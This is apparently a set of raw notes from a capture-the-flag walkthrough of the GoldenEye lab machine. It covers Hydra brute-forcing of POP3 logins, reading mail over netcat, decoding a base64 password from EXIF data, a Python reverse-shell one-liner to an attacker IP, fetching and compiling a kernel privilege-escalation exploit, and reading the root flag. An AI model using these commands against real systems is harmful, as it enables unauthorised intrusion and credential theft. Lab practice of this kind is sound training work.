@@ -1,0 +1,330 @@
+//I encoded you p@ssword below...
+//
+//&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
+
+
+from decimal:  InvincibleHack3r
+
+
+boris:InvincibleHack3r
+
+
+
+Qualified GoldenEye Network Operator Supervisors: 
+Natalya
+Boris
+
+ -->
+
+
+
+try pop on high port..
+
+
+root@ap:~/CTF/GoldenEye-v1# hydra -l boris -P /usr/share/wordlists/fasttrack.txt pop3://192.168.0.2 -s 55007
+Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-06-22 11:12:41
+[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 180 login tries (l:1/p:180), ~12 tries per task
+[DATA] attacking pop3://192.168.0.2:55007/
+[STATUS] 80.00 tries/min, 80 tries in 00:01h, 100 to do in 00:02h, 16 active
+[55007][pop3] host: 192.168.0.2   login: boris   password: secret1!
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-06-22 11:14:22
+
+
+
+root@ap:~/CTF/GoldenEye-v1# hydra -l boris -P /usr/share/wordlists/fasttrack.txt pop3://192.168.0.2 -s 55007
+Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-06-22 11:12:41
+[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 180 login tries (l:1/p:180), ~12 tries per task
+[DATA] attacking pop3://192.168.0.2:55007/
+[STATUS] 80.00 tries/min, 80 tries in 00:01h, 100 to do in 00:02h, 16 active
+[55007][pop3] host: 192.168.0.2   login: boris   password: secret1!
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-06-22 11:14:22
+
+
+
+
+root@ap:~/CTF/GoldenEye-v1# nc 192.168.0.2 55007
++OK GoldenEye POP3 Electronic-Mail System
+
+-ERR Unknown command.
+USER boris
++OK
+PASS secret1!
++OK Logged in.
+LIST
++OK 3 messages:
+1 544
+2 373
+3 921
+.
+1
+-ERR Unknown command: 1
+RETR 1
++OK 544 octets
+Return-Path: <root@127.0.0.1.goldeneye>
+X-Original-To: boris
+Delivered-To: boris@ubuntu
+Received: from ok (localhost [127.0.0.1])
+	by ubuntu (Postfix) with SMTP id D9E47454B1
+	for <boris>; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
+Message-Id: <20180425022326.D9E47454B1@ubuntu>
+Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
+From: root@127.0.0.1.goldeneye
+
+Boris, this is admin. You can electronically communicate to co-workers and students here. I'm not going to scan emails for security risks because I trust you and the other admins here.
+.
+RETR 2
++OK 373 octets
+Return-Path: <natalya@ubuntu>
+X-Original-To: boris
+Delivered-To: boris@ubuntu
+Received: from ok (localhost [127.0.0.1])
+	by ubuntu (Postfix) with ESMTP id C3F2B454B1
+	for <boris>; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
+Message-Id: <20180425024249.C3F2B454B1@ubuntu>
+Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
+From: natalya@ubuntu
+
+Boris, I can break your codes!
+.
+RETR 3
++OK 921 octets
+Return-Path: <alec@janus.boss>
+X-Original-To: boris
+Delivered-To: boris@ubuntu
+Received: from janus (localhost [127.0.0.1])
+	by ubuntu (Postfix) with ESMTP id 4B9F4454B1
+	for <boris>; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
+Message-Id: <20180425025235.4B9F4454B1@ubuntu>
+Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
+From: alec@janus.boss
+
+Boris,
+
+Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!
+
+Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....
+
+PS - Keep security tight or we will be compromised.
+
+.
+
+
+
+
+
+root@ap:~/CTF/GoldenEye-v1# nc 192.168.0.2 55007
++OK GoldenEye POP3 Electronic-Mail System
+USER natalya
++OK
+PASS bird
++OK Logged in.
+list
++OK 2 messages:
+1 631
+2 1048
+.
+retr 1
++OK 631 octets
+Return-Path: <root@ubuntu>
+X-Original-To: natalya
+Delivered-To: natalya@ubuntu
+Received: from ok (localhost [127.0.0.1])
+	by ubuntu (Postfix) with ESMTP id D5EDA454B1
+	for <natalya>; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
+Message-Id: <20180425024542.D5EDA454B1@ubuntu>
+Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
+From: root@ubuntu
+
+Natalya, please you need to stop breaking boris' codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.
+
+Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.
+.
+retr 2
++OK 1048 octets
+Return-Path: <root@ubuntu>
+X-Original-To: natalya
+Delivered-To: natalya@ubuntu
+Received: from root (localhost [127.0.0.1])
+	by ubuntu (Postfix) with SMTP id 17C96454B1
+	for <natalya>; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
+Message-Id: <20180425031956.17C96454B1@ubuntu>
+Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
+From: root@ubuntu
+
+Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...even if it's not, just enter it in under the guise of "security"...it'll get the change order escalated without much hassle :)
+
+Ok, user creds are:
+
+username: xenia
+password: RCP90rulez!
+
+Boris verified her as a valid contractor so just create the account ok?
+
+And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir
+**Make sure to edit your host file since you usually work remote off-network....
+
+Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.
+
+
+.
+
+
+
+Find email in Web App
+
+
+root@ap:~/CTF/GoldenEye-v1# hydra -l doak -P /usr/share/wordlists/fasttrack.txt pop3://192.168.0.2 -s 55007
+Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-06-22 12:14:15
+[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 180 login tries (l:1/p:180), ~12 tries per task
+[DATA] attacking pop3://192.168.0.2:55007/
+[STATUS] 80.00 tries/min, 80 tries in 00:01h, 100 to do in 00:02h, 16 active
+[55007][pop3] host: 192.168.0.2   login: doak   password: goat
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-06-22 12:15:37
+
+
+root@ap:~/CTF/GoldenEye-v1# nc 192.168.0.2 55007
++OK GoldenEye POP3 Electronic-Mail System
+user doak
++OK
+pass goat
++OK Logged in.
+list
++OK 1 messages:
+1 606
+.
+retr 1
++OK 606 octets
+Return-Path: <doak@ubuntu>
+X-Original-To: doak
+Delivered-To: doak@ubuntu
+Received: from doak (localhost [127.0.0.1])
+	by ubuntu (Postfix) with SMTP id 97DC24549D
+	for <doak>; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
+Message-Id: <20180425034731.97DC24549D@ubuntu>
+Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
+From: doak@ubuntu
+
+James,
+If you're reading this, congrats you've gotten this far. You know how tradecraft works right?
+
+Because I don't. Go to our training site and login to my account....dig until you can exfiltrate further information......
+
+username: dr_doak
+password: 4England!
+
+
+root@ap:~/CTF/GoldenEye-v1# exif for-007.jpg 
+Tag EXIF in «for-007.jpg» (ordinato per byte «Motorola»):
+--------------------+----------------------------------------------------------
+Tag                 |Valore
+--------------------+----------------------------------------------------------
+Descrizione immagine|eFdpbnRlcjE5OTV4IQ==
+Produttore          |GoldenEye
+Unità di risoluzione|Pollici
+Software            |linux
+Autore              |For James
+Posizionamento YCbCr|Centrato
+Risoluzione X       |72
+Risoluzione Y       |72
+Versione Exif       |Versione Exif sconosciuta
+Components Configura|Y Cb Cr -
+Commenti utente     |For 007
+FlashPixVersion     |FlashPix versione 1.0
+Spazio colore       |Non calibrato
+--------------------+----------------------------------------------------------
+root@ap:~/CTF/GoldenEye-v1# echo "eFdpbnRlcjE5OTV4IQ==" | base64 -d
+xWinter1995x!
+
+
+Reverse shell:
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+
+
+--2020-06-22 12:52:43--  http://192.168.0.5:8888/exp.c
+Connecting to 192.168.0.5:8888... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 5120 (5.0K) [text/plain]
+Saving to: 'exp.c'
+
+100%[======================================>] 5,120       --.-K/s   in 0s      
+
+2020-06-22 12:52:43 (317 MB/s) - 'exp.c' saved [5120/5120]
+
+www-data@ubuntu:/tmp$ 
+
+www-data@ubuntu:/tmp$ 
+
+www-data@ubuntu:/tmp$ cc exp.c -o a
+cc exp.c -o a
+exp.c:94:1: warning: control may reach end of non-void function [-Wreturn-type]
+}
+^
+exp.c:106:12: warning: implicit declaration of function 'unshare' is invalid in C99 [-Wimplicit-function-declaration]
+        if(unshare(CLONE_NEWUSER) != 0)
+           ^
+exp.c:111:17: warning: implicit declaration of function 'clone' is invalid in C99 [-Wimplicit-function-declaration]
+                clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);
+                ^
+exp.c:117:13: warning: implicit declaration of function 'waitpid' is invalid in C99 [-Wimplicit-function-declaration]
+            waitpid(pid, &status, 0);
+            ^
+exp.c:127:5: warning: implicit declaration of function 'wait' is invalid in C99 [-Wimplicit-function-declaration]
+    wait(NULL);
+    ^
+5 warnings generated.
+www-data@ubuntu:/tmp$ 
+
+www-data@ubuntu:/tmp$ ./a
+./a
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+# id
+id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+# cd root
+cd root
+sh: 2: cd: can't cd to root
+# cd /root
+cd /root
+# ls
+ls
+# ls -la
+ls -la
+total 44
+drwx------  3 root root 4096 Apr 29  2018 .
+drwxr-xr-x 22 root root 4096 Apr 24  2018 ..
+-rw-r--r--  1 root root   19 May  3  2018 .bash_history
+-rw-r--r--  1 root root 3106 Feb 19  2014 .bashrc
+drwx------  2 root root 4096 Apr 28  2018 .cache
+-rw-------  1 root root  144 Apr 29  2018 .flag.txt
+-rw-r--r--  1 root root  140 Feb 19  2014 .profile
+-rw-------  1 root root 1024 Apr 23  2018 .rnd
+-rw-------  1 root root 8296 Apr 29  2018 .viminfo
+# cat .flag.txt
+cat .flag.txt
+Alec told me to place the codes here: 
+
+568628e0d993b1973adc718237da6e93
+
+If you captured this make sure to go here.....
+/006-final/xvf7-flag/
+
+# 
+
